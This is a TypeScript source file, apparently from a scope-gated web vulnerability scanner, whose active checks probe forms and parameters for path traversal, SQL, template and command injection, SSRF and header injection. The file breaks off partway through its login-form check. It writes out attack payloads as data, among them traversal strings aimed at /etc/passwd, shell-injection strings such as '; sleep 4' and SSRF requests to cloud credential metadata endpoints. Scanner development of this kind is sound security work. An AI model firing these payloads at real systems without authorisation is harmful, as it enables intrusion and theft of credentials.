import type { FindingDraft, HttpResponse, PhaseTask, ProbeContext } from "../types";
import { scanTextForSecrets } from "../recon-utils";
import { truncate } from "../util";

/**
 * Active web checks. Everything here is read-only: one request per payload,
 * no writes, no brute force of real accounts and no payload that changes state.
 * Tasks are gated by scope (requiresActive) or explicit intrusive authorization.
 */

export interface ParsedForm {
  action: string;
  method: string;
  hasPassword: boolean;
  fields: Record<string, string>;
}

const SQL_ERROR_PATTERNS: Array<{ id: string; pattern: RegExp }> = [
  { id: "mysql", pattern: /You have an error in your SQL syntax|Warning:\s*mysqli|MySqlException|ER_PARSE_ERROR/i },
  { id: "postgres", pattern: /PostgreSQL.*ERROR|pg_query\(\)|syntax error at or near|unterminated quoted string/i },
  { id: "mssql", pattern: /Microsoft OLE DB Provider for SQL Server|Unclosed quotation mark after the character string|SqlException/i },
  { id: "oracle", pattern: /ORA-\d{5}|Oracle error|quoted string not properly terminated/i },
  { id: "sqlite", pattern: /SQLite\/JDBCDriver|SQLite.Exception|SQLITE_ERROR|sqlite3\.OperationalError/i },
  { id: "generic", pattern: /SQLSTATE\[\w+\]|SequelizeDatabaseError|PrismaClientKnownRequestError|SQL syntax.*near/i },
];

const TRAVERSAL_SIGNATURES: Array<{ id: string; pattern: RegExp; label: string }> = [
  { id: "passwd", pattern: /^root:.*:0:0:/m, label: "Unix /etc/passwd" },
  { id: "passwd-shadow", pattern: /^(daemon|bin|sys):.*:\/usr\/sbin:/m, label: "Unix account database" },
  { id: "winini", pattern: /\[fonts\]|\[extensions\]|; for 16-bit app support/i, label: "Windows win.ini" },
  { id: "hosts", pattern: /^127\.0\.0\.1\s+localhost/m, label: "Unix /etc/hosts" },
];

const SSRF_SIGNATURES: Array<{ id: string; pattern: RegExp; label: string }> = [
  { id: "aws-role", pattern: /"AccessKeyId"\s*:|"SecretAccessKey"\s*:|security-credentials/i, label: "cloud credential metadata" },
  { id: "aws-meta", pattern: /ami-id|instance-id|security-credentials|placement\/availability-zone/i, label: "instance metadata" },
  { id: "gcp-meta", pattern: /computeMetadata|service-accounts\/default\/token/i, label: "GCP metadata" },
  { id: "azure-meta", pattern: /MSI_ENDPOINT|IDENTITY_ENDPOINT|metadata\/instance/i, label: "Azure managed identity metadata" },
];

const COMMON_PARAMS = [
  "q",
  "query",
  "search",
  "id",
  "page",
  "file",
  "path",
  "filename",
  "url",
  "uri",
  "target",
  "view",
  "template",
  "download",
  "doc",
  "name",
  "user",
  "email",
  "lang",
];

const URL_LIKE_PARAMS = new Set([
  "url",
  "uri",
  "link",
  "src",
  "source",
  "dest",
  "destination",
  "redirect",
  "next",
  "return",
  "returnurl",
  "continue",
  "callback",
  "webhook",
  "image",
  "imageurl",
  "fetch",
  "proxy",
  "host",
  "domain",
  "endpoint",
  "target",
  "feed",
  "avatar",
]);

export function detectSqlError(body: string): { id: string; text: string } | undefined {
  for (const entry of SQL_ERROR_PATTERNS) {
    const match = entry.pattern.exec(body);
    if (match) {
      const line = body.slice(Math.max(0, match.index - 100), Math.min(body.length, match.index + 260));
      return { id: entry.id, text: truncate(line.replace(/\s+/g, " ").trim(), 300) };
    }
  }
  return undefined;
}

export function detectTraversal(body: string): { id: string; label: string; text: string } | undefined {
  for (const entry of TRAVERSAL_SIGNATURES) {
    const match = entry.pattern.exec(body);
    if (match) {
      const line = body.slice(Math.max(0, match.index - 60), Math.min(body.length, match.index + 220));
      return { id: entry.id, label: entry.label, text: truncate(line.replace(/\s+/g, " ").trim(), 240) };
    }
  }
  return undefined;
}

export function detectSsrf(body: string): { id: string; label: string; text: string } | undefined {
  for (const entry of SSRF_SIGNATURES) {
    const match = entry.pattern.exec(body);
    if (match) {
      const line = body.slice(Math.max(0, match.index - 80), Math.min(body.length, match.index + 220));
      return { id: entry.id, label: entry.label, text: truncate(line.replace(/\s+/g, " ").trim(), 240) };
    }
  }
  return undefined;
}

function attributes(raw: string): Record<string, string> {
  const output: Record<string, string> = {};
  const pattern = /([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/g;
  let match: RegExpExecArray | null;
  while ((match = pattern.exec(raw)) !== null) {
    output[match[1]!.toLowerCase()] = match[2] ?? match[3] ?? match[4] ?? "";
  }
  return output;
}

/**
 * Every form on the page with its inputs, including search and filter forms.
 * Login detection uses the password-filtering wrapper below; injection testing
 * needs the ordinary forms too, because that is where user input actually goes.
 */
export function parseAllForms(html: string, baseUrl: string): ParsedForm[] {
  const forms: ParsedForm[] = [];
  const formPattern = /<form\b([^>]*)>([\s\S]*?)<\/form>/gi;
  let match: RegExpExecArray | null;
  while ((match = formPattern.exec(html)) !== null) {
    const formAttrs = attributes(match[1] ?? "");
    const inner = match[2] ?? "";
    const fields: Record<string, string> = {};
    let hasPassword = false;
    const inputPattern = /<(?:input|textarea|select)\b([^>]*)>/gi;
    let input: RegExpExecArray | null;
    while ((input = inputPattern.exec(inner)) !== null) {
      const attrs = attributes(input[1] ?? "");
      const name = attrs.name;
      if (!name) continue;
      const type = (attrs.type ?? "text").toLowerCase();
      if (type === "password") hasPassword = true;
      if (["submit", "button", "reset", "file"].includes(type)) continue;
      fields[name] = attrs.value ?? "";
    }
    if (Object.keys(fields).length === 0) continue;
    let action: string;
    try {
      action = new URL(formAttrs.action || baseUrl, baseUrl).toString();
    } catch {
      action = baseUrl;
    }
    forms.push({
      action,
      method: (formAttrs.method ?? "get").toLowerCase() === "post" ? "post" : "get",
      hasPassword,
      fields,
    });
  }
  return forms;
}

/** Login forms only: the shape credential checks and default-login probing need. */
export function parseForms(html: string, baseUrl: string): ParsedForm[] {
  return parseAllForms(html, baseUrl).filter((form) => form.hasPassword);
}

export function extractScriptSources(html: string, baseUrl: string): string[] {
  const urls = new Set<string>();
  const pattern = /<script\b[^>]*\bsrc\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\s>]+))/gi;
  let match: RegExpExecArray | null;
  while ((match = pattern.exec(html)) !== null) {
    const raw = (match[1] ?? match[2] ?? match[3] ?? "").trim();
    if (!raw || raw.startsWith("data:")) continue;
    try {
      const url = new URL(raw, baseUrl);
      if (url.protocol === "http:" || url.protocol === "https:") urls.add(url.toString());
    } catch {
      // ignore malformed script URLs
    }
  }
  return [...urls];
}

function parameterNames(ctx: ProbeContext, html: string, baseUrl: string, includeCommon: boolean): string[] {
  const names = new Set<string>();
  try {
    const url = new URL(baseUrl);
    for (const key of url.searchParams.keys()) names.add(key);
  } catch {
    // ignore malformed baseline URL
  }
  for (const form of parseForms(html, baseUrl)) {
    for (const key of Object.keys(form.fields)) names.add(key);
  }
  const linkPattern = /href\s*=\s*(?:"([^"]+)"|'([^']+)')/gi;
  let link: RegExpExecArray | null;
  while ((link = linkPattern.exec(html)) !== null && names.size < 30) {
    const raw = link[1] ?? link[2] ?? "";
    try {
      const url = new URL(raw, baseUrl);
      for (const key of url.searchParams.keys()) names.add(key);
    } catch {
      // ignore malformed links
    }
  }
  if (includeCommon) for (const key of COMMON_PARAMS) if (names.size < 24) names.add(key);
  return [...names].slice(0, 16);
}

function withParam(baseUrl: string, name: string, value: string): string {
  const url = new URL(baseUrl);
  url.searchParams.set(name, value);
  return url.toString();
}

/**
 * A parameter the application actually reads: either a query parameter on a URL
 * it publishes, or a field in one of its forms.
 */
export interface InjectionPoint {
  url: string;
  name: string;
  method: "GET" | "POST";
  /** the form's other fields, replayed so the request stays valid */
  fields?: Record<string, string>;
}

/** Pages fetched while looking for parameters. Keeps the crawl bounded. */
const CRAWL_PAGES = 8;
const MAX_POINTS = 12;

function inScope(ctx: ProbeContext, raw: string, origin: string): URL | undefined {
  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    return undefined;
  }
  if (url.origin !== origin) return undefined;
  if (url.protocol !== "http:" && url.protocol !== "https:") return undefined;
  url.hash = "";
  return ctx.guard.checkUrl(url.toString()).allowed ? url : undefined;
}

function pageLinks(html: string, baseUrl: string): string[] {
  const links: string[] = [];
  const pattern = /href\s*=\s*(?:"([^"]+)"|'([^']+)')/gi;
  let match: RegExpExecArray | null;
  while ((match = pattern.exec(html)) !== null) {
    const raw = (match[1] ?? match[2] ?? "").trim();
    if (!raw || raw.startsWith("#") || /^(?:mailto|tel|javascript|data):/i.test(raw)) continue;
    try {
      links.push(new URL(raw, baseUrl).toString());
    } catch {
      // ignore malformed links
    }
  }
  return links;
}

/**
 * Discovers the surface worth attacking. Mutating the entry URL alone tests a
 * parameter that usually does not exist, so every attack task needs the URLs and
 * forms the site actually publishes, one bounded hop deep.
 */
export async function injectionPoints(ctx: ProbeContext): Promise<InjectionPoint[]> {
  const cached = ctx.state.get("attacks:points");
  if (Array.isArray(cached)) return cached as InjectionPoint[];
  const page = await baseline(ctx);
  if (!page) return [];
  let origin: string;
  try {
    origin = new URL(page.finalUrl).origin;
  } catch {
    return [];
  }

  const points: InjectionPoint[] = [];
  const seen = new Set<string>();
  const crawlQueue: string[] = [];
  const queued = new Set<string>();

  const addUrl = (raw: string) => {
    const url = inScope(ctx, raw, origin);
    if (!url) return;
    for (const name of url.searchParams.keys()) {
      const key = `GET ${url.pathname} ${name}`;
      if (seen.has(key)) continue;
      seen.add(key);
      points.push({ url: url.toString(), name, method: "GET" });
      if (points.length >= MAX_POINTS) return;
    }
  };
  const enqueue = (raw: string) => {
    const url = inScope(ctx, raw, origin);
    if (!url || queued.has(url.pathname)) return;
    queued.add(url.pathname);
    crawlQueue.push(url.toString());
  };

  addUrl(page.finalUrl);
  // Links are queued, not trusted: a parameter only becomes attack surface once
  // the page itself answers, so broken and placeholder links cost no payloads.
  for (const link of pageLinks(page.body, page.finalUrl)) enqueue(link);

  // Forms post user input straight into the application; attack those too.
  for (const form of parseAllForms(page.body, page.finalUrl)) {
    const action = inScope(ctx, form.action, origin);
    if (!action) continue;
    for (const name of Object.keys(form.fields)) {
      const key = `${form.method.toUpperCase()} ${action.pathname} ${name}`;
      if (seen.has(key)) continue;
      seen.add(key);
      points.push({
        url: action.toString(),
        name,
        method: form.method === "post" ? "POST" : "GET",
        fields: form.fields,
      });
      if (points.length >= MAX_POINTS) break;
    }
  }

  const visited = new Set<string>([new URL(page.finalUrl).pathname]);
  for (const next of crawlQueue) {
    if (points.length >= MAX_POINTS || visited.size > CRAWL_PAGES) break;
    const path = new URL(next).pathname;
    if (visited.has(path)) continue;
    visited.add(path);
    const response = await safeGet(ctx, next, { maxBodyBytes: 800_000 });
    if (!response || response.status >= 400) continue;
    addUrl(response.finalUrl);
    for (const link of pageLinks(response.body, response.finalUrl)) enqueue(link);
    for (const form of parseAllForms(response.body, response.finalUrl)) {
      const action = inScope(ctx, form.action, origin);
      if (!action) continue;
      for (const name of Object.keys(form.fields)) {
        const key = `${form.method.toUpperCase()} ${action.pathname} ${name}`;
        if (seen.has(key)) continue;
        seen.add(key);
        points.push({
          url: action.toString(),
          name,
          method: form.method === "post" ? "POST" : "GET",
          fields: form.fields,
        });
        if (points.length >= MAX_POINTS) break;
      }
      if (points.length >= MAX_POINTS) break;
    }
  }

  let capped = points.slice(0, MAX_POINTS);
  if (capped.length === 0) {
    for (const name of COMMON_PARAMS.slice(0, MAX_POINTS)) {
      capped.push({ url: page.finalUrl, name, method: "GET" });
    }
    ctx.log(
      "info",
      `No parameters published; probing ${capped.length} conventional name(s) on ${new URL(page.finalUrl).pathname}`,
      "attack",
    );
  }
  if (capped.length > 0) {
    ctx.log("info", `Attack surface: ${capped.length} parameter(s) across ${visited.size} page(s)`, "attack");
  }
  ctx.state.set("attacks:points", capped);
  return capped;
}

/**
 * Sends one payload to one injection point. POST bodies are replayed with the
 * form's original fields so the application still accepts the request.
 */
/**
 * One line per payload fired, so the live pane can show the pass working: the
 * endpoint, the payload, the status, the size and how long it took.
 */
function logTraffic(
  ctx: ProbeContext,
  method: "GET" | "POST",
  point: InjectionPoint,
  payload: string,
  response: HttpResponse | undefined,
): void {
  let path = point.url;
  try {
    path = new URL(point.url).pathname;
  } catch {
    // keep the raw url
  }
  const sent = `${method} ${path} ${point.name}=${truncate(payload, 44)}`;
  if (!response) {
    ctx.log("debug", `${sent} | no response`, "attack");
    return;
  }
  const size = response.bodyBytes >= 1024 ? `${(response.bodyBytes / 1024).toFixed(1)}KB` : `${response.bodyBytes}B`;
  ctx.log("info", `${sent} | ${response.status} ${size} ${response.elapsedMs}ms`, "attack");
}

async function sendPayload(
  ctx: ProbeContext,
  point: InjectionPoint,
  payload: string,
  options?: Parameters<ProbeContext["http"]["get"]>[1],
): Promise<{ response?: HttpResponse; url: string }> {
  if (point.method === "POST") {
    const body = new URLSearchParams({ ...point.fields, [point.name]: payload });
    try {
      const response = await ctx.http.post(point.url, body.toString(), {
        ...options,
        headers: { "content-type": "application/x-www-form-urlencoded", ...(options?.headers ?? {}) },
      });
      logTraffic(ctx, "POST", point, payload, response);
      return { response, url: `${point.url} [POST ${point.name}=${truncate(payload, 60)}]` };
    } catch (error) {
      if (!(error instanceof Error) || error.name !== "ScopeViolationError") {
        ctx.log("debug", `active POST failed: ${error instanceof Error ? error.message : String(error)}`, "attack");
      }
      return { url: point.url };
    }
  }
  const url = withParam(point.url, point.name, payload);
  if (!ctx.guard.checkUrl(url).allowed) return { url };
  const response = await safeGet(ctx, url, options);
  logTraffic(ctx, "GET", point, payload, response);
  return { response, url };
}

/** POST bodies change server state, so they need intrusive authorization. */
function allowsPost(ctx: ProbeContext, point: InjectionPoint): boolean {
  if (point.method !== "POST") return true;
  return Boolean(ctx.options.intrusive && ctx.scope.allowIntrusive);
}

async function baseline(ctx: ProbeContext): Promise<HttpResponse | undefined> {
  const cached = ctx.state.get("attacks:baseline") as HttpResponse | undefined;
  if (cached) return cached;
  const started = ctx.target.url ?? ctx.target.baseUrl;
  if (!started) return undefined;
  try {
    const response = await ctx.http.get(started, { maxBodyBytes: 2_000_000 });
    ctx.state.set("attacks:baseline", response);
    return response;
  } catch (error) {
    ctx.log("warn", `baseline for active checks failed: ${error instanceof Error ? error.message : String(error)}`, "attack");
    return undefined;
  }
}

async function safeGet(ctx: ProbeContext, url: string, options?: Parameters<ProbeContext["http"]["get"]>[1]): Promise<HttpResponse | undefined> {
  try {
    return await ctx.http.get(url, options);
  } catch (error) {
    if (error instanceof Error && error.name === "ScopeViolationError") return undefined;
    ctx.log("debug", `active request failed: ${error instanceof Error ? error.message : String(error)}`, "attack");
    return undefined;
  }
}

function loginPaths(ctx: ProbeContext): string[] {
  return ["/login", "/signin", "/auth/login", "/admin/login", "/wp-login.php"].map(
    (path) => new URL(path, ctx.target.baseUrl ?? ctx.target.url).toString(),
  );
}

async function findLoginForm(ctx: ProbeContext, html: string, baseUrl: string): Promise<ParsedForm | undefined> {
  const direct = parseForms(html, baseUrl);
  if (direct.length > 0) return direct[0];
  for (const url of loginPaths(ctx)) {
    if (!ctx.guard.checkUrl(url).allowed) continue;
    const page = await safeGet(ctx, url, { maxBodyBytes: 500_000 });
    if (!page || page.status >= 400) continue;
    const forms = parseForms(page.body, page.finalUrl);
    if (forms.length > 0) {
      ctx.state.set("attacks:login-page", page.finalUrl);
      return forms[0];
    }
  }
  return undefined;
}

function credentialsBody(form: ParsedForm, user: string, password: string): string {
  const body = new URLSearchParams();
  for (const [key, value] of Object.entries(form.fields)) body.set(key, value);
  const userField = Object.keys(form.fields).find((key) => /user|email|login|account/i.test(key)) ?? "username";
  const passField = Object.keys(form.fields).find((key) => /pass|pwd|secret/i.test(key)) ?? "password";
  body.set(userField, user);
  body.set(passField, password);
  return body.toString();
}

function looksLoggedIn(response: HttpResponse): boolean {
  const location = response.headers.location ?? "";
  if ([301, 302, 303, 307, 308].includes(response.status)) {
    if (/login|signin|auth|error|fail|denied/i.test(location)) return false;
    // A redirect alone is not proof: failed logins also redirect. Require a
    // new session cookie, a token in the redirect, or a privileged destination.
    const sessionCookie = Boolean(response.headers["set-cookie"]);
    const tokenRedirect = /(?:token|session|auth)=/i.test(location);
    return sessionCookie || tokenRedirect || /dashboard|account|admin|welcome/i.test(location);
  }
  if (response.status !== 200) return false;
  if (parseForms(response.body, response.finalUrl).length > 0) return false;
  return /log\s*out|sign\s*out|dashboard|welcome back|my account/i.test(response.body);
}

export const attackTasks: PhaseTask[] = [
  {
    id: "js-bundles",
    label: "Client bundle secrets & source exposure",
    phase: "audit",
    run: async (ctx) => {
      const page = await baseline(ctx);
      if (!page) return;
      const findings: FindingDraft[] = [];
      let origin: string;
      try {
        origin = new URL(page.finalUrl).origin;
      } catch {
        return;
      }
      const scripts = extractScriptSources(page.body, page.finalUrl).filter((url) => {
        try {
          return new URL(url).origin === origin;
        } catch {
          return false;
        }
      });
      let scanned = 0;
      const seen = new Set<string>();
      for (const script of scripts.slice(0, 10)) {
        if (ctx.signal.aborted) break;
        const response = await safeGet(ctx, script, { maxBodyBytes: 1_500_000 });
        if (!response || response.status !== 200) continue;
        scanned += 1;
        for (const hit of scanTextForSecrets(response.body, { limit: 10 })) {
          const key = `${hit.id}:${hit.masked}`;
          if (seen.has(key)) continue;
          seen.add(key);
          findings.push({
            title: `Secret exposed in client bundle: ${hit.name}`,
            severity: hit.severity,
            category: "secrets",
            confidence: hit.confidence,
            tool: "argus-jsbundle",
            url: script,
            evidence: `${script}\nline ${hit.line}: ${truncate(hit.context, 300)}\nmatch: ${hit.masked}`,
            description: "A credential-like value is shipped in JavaScript that any visitor can download. Client-side secrets cannot be protected by access controls.",
            remediation: "Remove the value from client code, rotate it immediately, and move the privileged call to a server-side endpoint with a short-lived token.",
            references: ["https://cwe.mitre.org/data/definitions/798.html"],
            cwe: "CWE-798",
            dedupeKey: `jsbundle-secret-${hit.id}-${hit.masked}`,
          });
          if (findings.length >= 8) break;
        }
      }
      if (scanned > 0) ctx.log("info", `Scanned ${scanned} client bundle(s) for secrets`, "attack");
      return findings;
    },
  },
  {
    id: "path-traversal",
    label: "Path traversal & file disclosure",
    phase: "audit",
    requiresActive: true,
    run: async (ctx) => {
      const page = await baseline(ctx);
      if (!page) return;
      const findings: FindingDraft[] = [];
      const points = (await injectionPoints(ctx)).filter((point) => allowsPost(ctx, point));
      const payloads = [
        "../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..\\..\\..\\..\\..\\windows\\win.ini",
      ];
      for (const point of points) {
        const name = point.name;
        for (const payload of payloads) {
          if (ctx.signal.aborted) break;
          const { response, url } = await sendPayload(ctx, point, payload, { maxBodyBytes: 400_000 });
          if (!response) continue;
          const signal = detectTraversal(response.body);
          if (!signal) continue;
          findings.push({
            title: `Path traversal in parameter "${name}"`,
            severity: "high",
            category: "injection",
            confidence: "confirmed",
            tool: "argus-traversal",
            url,
            evidence: `${url}\nPayload: ${payload}\n${signal.label} content returned:\n${signal.text}`,
            description: "A user-controlled path escapes the intended directory and discloses a local file. This can expose credentials, configuration and source code.",
            remediation: "Resolve the requested path against a fixed base directory, reject traversal sequences after canonicalization, and serve files from an allowlist.",
            references: ["https://owasp.org/www-community/attacks/Path_Traversal"],
            cwe: "CWE-22",
            dedupeKey: `traversal-${name}-${point.url}-${signal.id}`,
          });
          break;
        }
        if (findings.length >= 5) break;
      }
      return findings;
    },
  },
  {
    id: "sqli",
    label: "SQL injection error signatures",
    phase: "audit",
    requiresActive: true,
    run: async (ctx) => {
      const page = await baseline(ctx);
      if (!page) return;
      const findings: FindingDraft[] = [];
      const baselineError = detectSqlError(page.body);
      const points = (await injectionPoints(ctx)).filter((point) => allowsPost(ctx, point));
      const payloads = ["'", "\"", "')", "' OR '1'='1"];
      for (const point of points) {
        const name = point.name;
        for (const payload of payloads) {
          if (ctx.signal.aborted) break;
          const { response, url } = await sendPayload(ctx, point, payload, { maxBodyBytes: 400_000 });
          if (!response) continue;
          const signal = detectSqlError(response.body);
          if (!signal || signal.id === baselineError?.id) continue;
          findings.push({
            title: `SQL injection in parameter "${name}"`,
            severity: "high",
            category: "injection",
            confidence: "confirmed",
            tool: "argus-sqli",
            url,
            evidence: `${url}\nPayload: ${payload}\n${signal.id} error:\n${signal.text}`,
            description: "The application returns a database error for a crafted parameter. Unsanitized input reaches a SQL query and may allow data disclosure or authentication bypass.",
            remediation: "Use parameterized queries or an ORM, validate input types, and return generic error pages without database details.",
            references: ["https://owasp.org/www-community/attacks/SQL_Injection"],
            cwe: "CWE-89",
            dedupeKey: `sqli-${name}-${point.url}-${signal.id}`,
          });
          break;
        }
        if (findings.length >= 5) break;
      }
      return findings;
    },
  },
  {
    id: "ssti",
    label: "Template injection evaluation",
    phase: "audit",
    requiresActive: true,
    run: async (ctx) => {
      const page = await baseline(ctx);
      if (!page) return;
      const findings: FindingDraft[] = [];
      const points = (await injectionPoints(ctx)).filter((point) => allowsPost(ctx, point));
      // The product never appears in a payload, so a reflected value cannot
      // masquerade as evaluation.
      const left = 4000 + Math.floor(Math.random() * 8000);
      const right = 31 + Math.floor(Math.random() * 60);
      const expected = String(left * right);
      const payloads = [
        `{{${left}*${right}}}`,
        `\${${left}*${right}}`,
        `<%= ${left}*${right} %>`,
        `#{${left}*${right}}`,
      ];
      for (const point of points) {
        const name = point.name;
        for (const payload of payloads) {
          if (ctx.signal.aborted) break;
          const { response, url } = await sendPayload(ctx, point, payload, { maxBodyBytes: 400_000 });
          if (!response) continue;
          if (response.body.includes(payload)) continue;
          if (!response.body.includes(expected)) continue;
          findings.push({
            title: `Template injection in parameter "${name}"`,
            severity: "high",
            category: "injection",
            confidence: "confirmed",
            tool: "argus-ssti",
            url,
            evidence: `${url}\nPayload: ${payload}\nResponse contains the evaluated product ${expected}; the payload itself does not.`,
            description:
              "The parameter is rendered by a server-side template engine. Depending on the engine this allows reading server variables, files and in many cases running commands.",
            remediation:
              "Never pass user input into template source. Use fixed templates with escaped variables, and restrict the engine's file and object access.",
            references: ["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection"],
            cwe: "CWE-1336",
            dedupeKey: `ssti-${name}-${point.url}`,
          });
          break;
        }
        if (findings.length >= 5) break;
      }
      return findings;
    },
  },
  {
    id: "command-injection",
    label: "Command injection echo & timing",
    phase: "audit",
    requiresActive: true,
    run: async (ctx) => {
      const page = await baseline(ctx);
      if (!page) return;
      const findings: FindingDraft[] = [];
      const left = 31 + Math.floor(Math.random() * 60);
      const right = 31 + Math.floor(Math.random() * 60);
      // The expected value is absent from the payload, so a reflected query
      // string alone can never be mistaken for command execution.
      const marker = String(left * right);
      const expression = `$(((${left})*(${right})))`;
      const points = (await injectionPoints(ctx)).filter((point) => allowsPost(ctx, point));
      const names = points.map((point) => point.name);
      const echoPayloads = [`; echo ${expression}`, `| echo ${expression}`, `$(echo ${expression})`];
      for (const point of points) {
        const name = point.name;
        for (const payload of echoPayloads) {
          if (ctx.signal.aborted) break;
          const { response, url } = await sendPayload(ctx, point, payload, { maxBodyBytes: 400_000 });
          if (!response || !response.body.includes(marker)) continue;
          findings.push({
            title: `Command injection in parameter "${name}"`,
            severity: "critical",
            category: "injection",
            confidence: "confirmed",
            tool: "argus-command",
            url,
            evidence: `${url}\nPayload: ${payload}\nThe shell evaluated the arithmetic expression and returned ${marker}; that value is not present in the payload.`,
            description: "Shell metacharacters in the parameter are executed by the server. An attacker can run arbitrary commands as the application user.",
            remediation: "Never build shell strings from input. Use an argument-array API, allowlist permitted values, and run with least privilege.",
            references: ["https://owasp.org/www-community/attacks/Command_Injection"],
            cwe: "CWE-78",
            dedupeKey: `command-echo-${name}-${point.url}`,
          });
          break;
        }
        if (findings.length >= 4) break;
      }
      const intrusive = Boolean(ctx.options.intrusive && ctx.scope.allowIntrusive);
      for (const point of intrusive && findings.length === 0 ? points.slice(0, 3) : []) {
        const name = point.name;
        const baselineStarted = Date.now();
        const { response: control } = await sendPayload(ctx, point, `argus-${marker}`, { maxBodyBytes: 200_000 });
        const controlMs = control ? Date.now() - baselineStarted : 0;
        const started = Date.now();
        const { response: delayed, url: sleepUrl } = await sendPayload(ctx, point, `; sleep 4`, { maxBodyBytes: 200_000 });
        const elapsed = Date.now() - started;
        if (delayed && control && elapsed - controlMs > 2500) {
          findings.push({
            title: `Time-based command injection in parameter "${name}"`,
            severity: "high",
            category: "injection",
            confidence: "likely",
            tool: "argus-command",
            url: sleepUrl,
            evidence: `${sleepUrl}\nControl request: ${controlMs}ms\nPayload "; sleep 4": ${elapsed}ms\nDelay ${elapsed - controlMs}ms above the control.`,
            description: "A shell sleep payload produced a repeatable delay, indicating that the parameter is evaluated by a command shell.",
            remediation: "Never build shell strings from input. Use an argument-array API, allowlist permitted values, and run with least privilege.",
            references: ["https://owasp.org/www-community/attacks/Command_Injection"],
            cwe: "CWE-78",
            dedupeKey: `command-timing-${name}-${point.url}`,
          });
          break;
        }
      }
      return findings;
    },
  },
  {
    id: "ssrf",
    label: "SSRF cloud metadata probe",
    phase: "audit",
    requiresActive: true,
    run: async (ctx) => {
      const page = await baseline(ctx);
      if (!page) return;
      const findings: FindingDraft[] = [];
      const discovered = (await injectionPoints(ctx)).filter((point) =>
        allowsPost(ctx, point) && URL_LIKE_PARAMS.has(point.name.toLowerCase()),
      );
      // APIs frequently accept a URL in a body field that the HTML surface does
      // not advertise; probe the conventional names when discovery finds none.
      const ssrfPoints: InjectionPoint[] = discovered.length > 0
        ? discovered
        : ["url", "uri", "next", "redirect", "callback", "image"]
            .filter((name) => URL_LIKE_PARAMS.has(name))
            .map((name) => ({ url: page.finalUrl, name, method: "GET" as const }));
      if (ssrfPoints.length === 0) return;
      const targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
      ];
      for (const point of ssrfPoints.slice(0, 6)) {
        const name = point.name;
        for (const target of targets) {
          if (ctx.signal.aborted) break;
          const { response, url } = await sendPayload(ctx, point, target, { maxBodyBytes: 400_000 });
          if (!response) continue;
          const signal = detectSsrf(response.body);
          if (!signal) continue;
          findings.push({
            title: `Server-side request forgery in parameter "${name}"`,
            severity: "high",
            category: "ssrf",
            confidence: "confirmed",
            tool: "argus-ssrf",
            url,
            evidence: `${url}\nPayload: ${target}\n${signal.label} returned:\n${signal.text}`,
            description: "The server fetched a URL supplied by the client and returned cloud metadata, which can expose temporary credentials and internal services.",
            remediation: "Resolve and validate outbound destinations: allow only public hosts, block link-local and private ranges, disable redirects, and require an allowlist.",
            references: ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
            cwe: "CWE-918",
            dedupeKey: `ssrf-${name}-${signal.id}`,
          });
          break;
        }
        if (findings.length >= 4) break;
      }
      return findings;
    },
  },
  {
    id: "header-injection",
    label: "CRLF & Host header injection",
    phase: "audit",
    requiresActive: true,
    run: async (ctx) => {
      const page = await baseline(ctx);
      if (!page) return;
      const findings: FindingDraft[] = [];
      const nonce = Math.random().toString(36).slice(2, 8);
      const hostCanary = `argus-${nonce}.invalid`;
      const hostResponse = await safeGet(ctx, page.finalUrl, {
        headers: { host: hostCanary },
        maxBodyBytes: 300_000,
      });
      if (hostResponse && hostResponse.body.includes(hostCanary) && !page.body.includes(hostCanary)) {
        findings.push({
          title: "Host header is reflected without validation",
          severity: "medium",
          category: "injection",
          confidence: "likely",
          tool: "argus-host",
          url: page.finalUrl,
          evidence: `Host: ${hostCanary}\nThe unvalidated host appears in the rendered page, which can poison password-reset and canonical links.`,
          description: "The application trusts the Host header. Cache poisoning and password-reset link manipulation become possible when the host is not validated.",
          remediation: "Validate Host against an allowlist of expected domains and build absolute URLs from configured values, not the request header.",
          references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection"],
          cwe: "CWE-644",
          dedupeKey: "host-header-reflection",
        });
      }
      const crlfNonce = `X-Argus-${nonce}`;
      const payloads = [`%0d%0a${crlfNonce}:%20injected`, `\r\n${crlfNonce}: injected`];
      for (const payload of payloads) {
        const url = withParam(page.finalUrl, "next", payload);
        if (!ctx.guard.checkUrl(url).allowed) continue;
        const response = await safeGet(ctx, url, { maxBodyBytes: 300_000, followRedirects: false });
        if (!response) continue;
        const headerHit = Object.keys(response.headers).some((key) => key.includes(crlfNonce.toLowerCase()));
        const bodyHit = response.body.includes(`${crlfNonce}: injected`);
        if (!headerHit && !bodyHit) continue;
        findings.push({
          title: "CRLF injection in a request parameter",
          severity: "medium",
          category: "injection",
          confidence: "confirmed",
          tool: "argus-crlf",
          url,
          evidence: `${url}\nPayload: ${payload}\n${headerHit ? "Injected response header observed." : "Injected header text is returned in the body."}`,
          description: "Line breaks in user input reach the response headers. This can enable response splitting, cache poisoning and script injection.",
          remediation: "Reject CR, LF and control characters in all reflected values and use a framework API that encodes response headers.",
          references: ["https://owasp.org/www-community/attacks/HTTP_Response_Splitting"],
          cwe: "CWE-93",
          dedupeKey: "crlf-param",
        });
        break;
      }
      return findings;
    },
  },
  {
    id: "auth-form",
    label: "Login form & credential transport",
    phase: "audit",
    requiresActive: true,
    run: async (ctx) => {
      const page = await baseline(ctx);
      if (!page) return;
      const form = await findLoginForm(ctx, page.body, page.finalUrl);
      if (!form) return;
      const findings: FindingDraft[] = [];
      if (form.method === "get") {
        findings.push({
          title: "Login form submits credentials with GET",
          severity: "high",
          category: "session",
          confidence: "confirmed",
          tool: "argus-auth",
          url: form.action,
          evidence: `Form action: ${form.action}\nMethod: GET\nField names: ${Object.keys(form.fields).join(", ") || "none"}`,
          description: "Credentials submitted with GET are placed in the URL, browser history, proxy logs and Referer headers.",
          remediation: "Submit credentials with POST over HTTPS and redirect to a clean URL after login.",
          references: ["https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"],
          cwe: "CWE-598",
